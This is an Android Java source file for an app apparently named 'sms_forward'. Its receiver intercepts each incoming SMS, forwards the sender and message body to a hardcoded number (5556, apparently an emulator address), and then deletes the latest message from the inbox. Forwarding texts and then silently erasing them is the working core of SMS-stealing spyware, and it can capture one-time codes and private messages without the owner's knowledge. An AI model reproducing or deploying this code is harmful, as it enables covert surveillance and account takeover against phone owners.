package roxma.org.sms_forward;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class SmsListener extends BroadcastReceiver {

    public SmsListener() {
    }


    @Override
    public void onReceive(Context context, Intent intent) {
        //Intercept incoming SMS
        SmsManager smsManager = SmsManager.getDefault();
        Bundle myBundle = intent.getExtras();

        if (myBundle != null) {
            Object[] pdus = (Object[]) myBundle.get("pdus");

            if (pdus == null)
                return;

            SmsMessage[] messages = new SmsMessage[pdus.length];

            for (int i = 0; i < messages.length; i++) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    String format = myBundle.getString("format");
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i], format);
                } else {
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                }


                //Creating message body for the forward sms
                String smsMessageStr = "SMS from the app: " + messages[i].getOriginatingAddress();
                smsMessageStr += " : ";
                smsMessageStr += messages[i].getMessageBody();

                //Forwarding the Message
                smsManager.sendTextMessage("5556", null, smsMessageStr, null, null);


                //Deleting the last incoming sms in the inbox
                deleteLastSms(context);
            }

        }
    }


    public boolean deleteLastSms(Context context) {
        boolean ret = false;

        Uri uriSMSURI = Uri.parse("content://sms/");
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cur = contentResolver.query(uriSMSURI, null, null, null, null);
        assert cur != null;
        if (cur.moveToFirst()) {
            ////Changed to 0 to get Message id instead of Thread id :
            String MsgId = cur.getString(0);
            ret = contentResolver.delete(Uri.parse("content://sms/" + MsgId), null, null)
                    == 1;
        }

        return ret;
    }
}